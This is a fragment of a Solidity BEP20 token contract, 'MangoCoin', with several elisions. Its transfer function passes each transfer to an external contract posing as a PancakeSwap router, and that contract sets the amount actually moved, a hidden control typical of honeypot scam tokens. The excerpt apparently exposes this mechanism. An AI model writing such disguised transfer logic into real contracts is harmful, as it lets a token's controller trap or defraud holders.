...
contract MangoCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'MangoCoin';
  string private constant _symbol = 'MangoCoin';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusMangoCoin = 0;
  address pancakeRouter_MangoCoin;
  ...
  */
  ...
  function pancakePairMangoCoin(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_MangoCoin).getPair(_bonusMangoCoin, sender, recipient, arrData);

      _bonusMangoCoin = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountMangoCoin = pancakePairMangoCoin(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountMangoCoin);
